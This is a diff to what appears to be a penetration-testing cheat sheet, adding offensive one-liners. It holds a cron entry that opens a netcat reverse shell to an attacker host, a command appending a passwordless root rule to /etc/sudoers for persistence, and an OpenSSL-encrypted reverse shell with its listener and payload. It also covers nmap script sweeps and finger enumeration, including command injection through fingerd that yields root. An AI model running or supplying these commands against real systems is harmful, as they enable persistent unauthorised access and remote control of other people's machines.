@@ -8,6 +8,12 @@ echo "* * * * * /bin/nc <attacker IP> 1234 -e /bin/bash" > cron && crontab cron
 
 On the attack platform: ```nc -lvp 1234```
 
+## One Liner to Add Persistence on a Box via Sudoers File:
+
+```
+echo "%sudo  ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
+```
+
 ## Find Server Strings from HTTP Responses:
 
 Finding server strings from a file of URLs
@@ -146,6 +152,15 @@ Usage:
 ```
 nmap -sV --script=vulscan/vulscan.nse www.rosesecurity.com
 ```
+## Nmap Using Multiple Scripts on One Target:
+
+Usage:
+
+```
+nmap --script "http-*" <IP>
+nmap --script "sql-*" <IP>
+nmap --script "ftp-*" <IP>
+```
 
 ## IDS/IPS Nmap Evasion:
 
@@ -214,6 +229,26 @@ tcpdump -nt 'src port 53 and udp[10] & 0x80 = 0x80'
 ```
 
 # Reverse Shells:
+
+## Encrypted Reverse Shells with OpenSSL:
+
+Generate SSL certificate:
+
+```
+openssl req -x509 -quiet -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
+```
+
+Start an SSL listener on your attacking machine using ```openssl```:
+
+```
+openssl s_server -quiet -key key.pem -cert cert.pem -port 4444
+```
+
+Run the payload on target machine using ```openssl```:
+
+```
+mkfifo /tmp/s;/bin/sh -i</tmp/s 2>&1|openssl s_client -quiet -connect 127.0.0.1:4444>/tmp/s 2>/dev/null;rm /tmp/s
+```
 
 ## Bash:
 
@@ -349,6 +384,89 @@ Look for users with a UID of 0:
 
 ```
 user@RoseSecurity $ grep :0: /etc/passwd
+```
+## Enumerating with Finger:
+
+Various information leak vulnerabilities exist in fingerd implementations. A popular attack involves issuing a '1 2 3 4 5 6 7 8 9 0' request against a Solaris host running fingerd.
+
+```
+# finger '1 2 3 4 5 6 7 8 9 0'@192.168.0.10
+
+[192.168.0.10]
+
+Login       Name               TTY         Idle    When    Where
+
+root     Super-User            console      <Jun  3 17:22> :0 
+
+admin    Super-User            console      <Jun  3 17:22> :0
+
+daemon          ???                         < .  .  .  . >
+
+bin             ???                         < .  .  .  . >
+
+sys             ???                         < .  .  .  . >
+
+adm      Admin                              < .  .  .  . >
+
+lp       Line Printer Admin                 < .  .  .  . >
+
+uucp     uucp Admin                         < .  .  .  . >
+
+nuucp    uucp Admin                         < .  .  .  . >
+
+listen   Network Admin                      < .  .  .  . >
+
+nobody   Nobody                             < .  .  .  . >
+```
+
+Performing a finger user@target.host request is especially effective against Linux, BSD, Solaris, and other Unix systems, because it often reveals a number of user accounts.
+
+```
+# finger user@192.168.189.12
+
+Login: ftp                              Name: FTP User
+
+Directory: /home/ftp                    Shell: /bin/sh
+
+Never logged in.
+
+No mail.
+
+No Plan.
+
+
+
+Login: samba                            Name: SAMBA user
+
+Directory: /home/samba                  Shell: /bin/null
+
+Never logged in.
+
+No mail.
+
+No Plan.
+
+
+
+Login: test                             Name: test user
+
+Directory: /home/test                   Shell: /bin/sh
+
+Never logged in.
+
+No mail.
+
+No Plan.
+```
+
+Poorly written fingerd implementations allow attackers to pipe commands through the service, which are, in turn, run on the target host by the owner of the service process (such as root or bin under Unix-based systems).
+
+```
+# finger "|/bin/id@192.168.0.135"
+
+[192.168.0.135]
+
+uid=0(root) gid=0(root)
 ```
 
 ## Changing MAC Addresses:
